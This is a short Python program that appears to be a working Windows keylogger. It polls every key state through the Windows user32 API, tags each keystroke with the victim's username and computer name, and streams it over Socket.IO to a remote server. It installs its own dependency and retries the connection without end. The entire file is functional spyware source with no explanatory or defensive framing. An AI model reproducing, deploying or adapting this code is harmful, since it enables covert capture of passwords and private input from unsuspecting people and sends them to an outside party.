import ctypes
import os
import time

try:
    import socketio
except ImportError:
    os.system("pip install python-socketio")
finally:
    import socketio

ORIGIN = "<[URL]>"
ID = f'{os.environ["USERNAME"]}-{os.environ["COMPUTERNAME"]}'
SIO = socketio.Client()
user32 = ctypes.windll.user32

def send(key):
    if not SIO.connected: return
    SIO.emit("data", {
       "id": ID,
       "key": key
    })

def keyboard():
    keyStates = {}
    while True:
        for i in range(256):
            if user32.GetAsyncKeyState(i) & 0x8000 != 0:
                if keyStates.get(i, False) == False:
                    keyStates[i] = True
                    code = str(i)
                    if user32.GetKeyState(0x14) & 0x0001 != 0:
                        code = f'@{code}'
                    send(code)
            else:
                keyStates[i] = False
        time.sleep(0.01)

@SIO.on("connect")
def onConnect():
    SIO.emit("connected", ID)
    keyboard()

@SIO.on("disconnect")
def onDisConnect():
    SIO.disconnect()
    os._exit(0)

def main():
    try:
        SIO.connect(ORIGIN)
        SIO.wait()
    except Exception as e:
        time.sleep(5)
        main()

if __name__ == '__main__':
    main()